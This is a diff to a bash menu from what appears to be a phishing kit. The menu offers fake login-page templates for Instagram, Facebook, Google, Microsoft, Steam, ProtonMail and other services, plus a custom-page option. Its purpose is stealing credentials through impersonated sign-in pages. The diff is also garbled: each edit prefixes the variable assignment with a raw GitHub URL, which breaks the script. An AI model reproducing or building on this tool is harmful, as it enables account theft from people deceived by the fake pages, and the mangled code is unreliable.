@@ -29,75 +29,75 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' op
 
 
 if [[ $option == 1 || $option == 01 ]]; then
-server="instagram"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="instagram"
 start1
 
 elif [[ $option == 2 || $option == 02 ]]; then
-server="facebook"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="facebook"
 start1
 elif [[ $option == 3 || $option == 03 ]]; then
-server="snapchat"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="snapchat"
 start1
 elif [[ $option == 4 || $option == 04 ]]; then
-server="twitter"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="twitter"
 start1
 elif [[ $option == 5 || $option == 05 ]]; then
-server="github"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="github"
 start1
 elif [[ $option == 6 || $option == 06 ]]; then
-server="google"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="google"
 start1
 
 elif [[ $option == 7 || $option == 07 ]]; then
-server="spotify"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="spotify"
 start1
 
 elif [[ $option == 8 || $option == 08 ]]; then
-server="netflix"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="netflix"
 start1
 
 elif [[ $option == 9 || $option == 09 ]]; then
-server="origin"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="origin"
 start1
 
 elif [[ $option == 10 ]]; then
-server="steam"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="steam"
 start1
 
 elif [[ $option == 11 ]]; then
-server="yahoo"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="yahoo"
 start1
 
 elif [[ $option == 12 ]]; then
-server="linkedin"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="linkedin"
 start1
 
 elif [[ $option == 13 ]]; then
-server="protonmail"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="protonmail"
 start1
 
 elif [[ $option == 14 ]]; then
-server="wordpress"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="wordpress"
 start1
 
 elif [[ $option == 15 ]]; then
-server="microsoft"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="microsoft"
 start1
 
 elif [[ $option == 16 ]]; then
-server="instafollowers"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="instafollowers"
 start1
 
 elif [[ $option == 17 ]]; then
-server="gitlab"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="gitlab"
 start1
 
 elif [[ $option == 18 ]]; then
-server="pinterest"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="pinterest"
 start1
 
 elif [[ $option == 19 ]]; then
-server="create"
+https://raw.githubusercontent.com/xhabibx/pishingHB/master/server="create"
 createpage
 start1
 
